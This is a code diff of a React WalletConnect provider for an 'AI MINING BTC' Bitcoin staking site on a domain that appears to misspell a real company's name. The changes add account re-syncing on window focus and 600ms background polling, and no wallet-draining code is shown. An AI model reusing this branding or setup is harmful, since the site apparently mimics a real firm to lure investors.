@@ -8,8 +8,8 @@ import { EthereumProvider } from '@walletconnect/ethereum-provider';
 const projectId = 'ec457184730a7f1e24bbe58a393f442b';
 const metadata = {
   name: 'AI MINING BTC',
-  description: 'Secure AI-powered Bitcoin Staking Platform.',
-  url: 'https://riotnode.riotplatfroms.workers.dev/',
+  description: 'AI-powered Bitcoin Staking Platform (RiotNode)',
+  url: 'https://riotnode.riotplatfroms.workers.dev',
   icons: ['https://riotnode.riotplatfroms.workers.dev/logo.png']
 };
 
@@ -110,8 +110,24 @@ export function WalletProvider({ children }: { children: React.ReactNode }) {
         init();
     }, []);
 
-    const forceSync = async () => {
-        setIsPulsing(true);
+    // INSTANT SYNC: When user returns from wallet app
+    useEffect(() => {
+        const handleSync = () => {
+            if (document.visibilityState === 'visible') {
+                console.log("[Web3] Visibility wake-up -> Syncing...");
+                forceSync();
+            }
+        };
+        document.addEventListener('visibilitychange', handleSync);
+        window.addEventListener('focus', handleSync);
+        return () => {
+            document.removeEventListener('visibilitychange', handleSync);
+            window.removeEventListener('focus', handleSync);
+        };
+    }, [walletProvider]);
+
+    const forceSync = async (silent = false) => {
+        if (!silent) setIsPulsing(true);
         if (walletProvider) {
             try {
                 const accounts = await walletProvider.request({ method: 'eth_accounts' });
@@ -129,8 +145,15 @@ export function WalletProvider({ children }: { children: React.ReactNode }) {
                 console.warn("[Sync] Fail:", e);
             }
         }
-        setTimeout(() => setIsPulsing(false), 1500);
+        if (!silent) setTimeout(() => setIsPulsing(false), 800);
     };
+
+    // HIGH-SPEED HEARTBEAT: Pulse every 600ms when waiting
+    useEffect(() => {
+        if (!handshakeUri && !showSelectionHub) return;
+        const interval = setInterval(() => forceSync(true), 600);
+        return () => clearInterval(interval);
+    }, [handshakeUri, showSelectionHub, walletProvider]);
 
     // AUTO-LAUNCHER: When a selection is made and URI arrives, FIRE it immediately
     useEffect(() => {
